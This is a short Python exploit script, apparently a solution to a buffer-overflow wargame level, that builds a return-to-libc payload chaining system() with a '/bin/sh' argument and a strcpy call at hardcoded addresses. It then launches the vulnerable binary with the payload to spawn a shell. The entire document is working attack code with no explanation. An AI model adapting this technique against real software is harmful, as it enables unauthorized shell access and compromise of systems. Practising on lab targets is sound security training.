import os

filename = "/home/succubus/nightmare"

payload = ""
payload = payload + "\xe0\x8a\x05\x40" # system's address
payload = payload + "A"*4 # system's ret address
payload = payload + "\xf9\xbf\x0f\x40" # system's param(/bin/sh)
payload = payload + "A"*32 # dummy
payload = payload + "\x10\x84\x04\x08" # strcpy's address(ret)
payload = payload + "A"*4 # waterfall(strcpy's ret address)
payload = payload + "\xa0\xfa\xff\xbf" # strcpy's dst(strcpy's ret)
payload = payload + "\x70\xfa\xff\xbf" # strcpy's source(buffer)

os.execv(filename, [filename, payload])
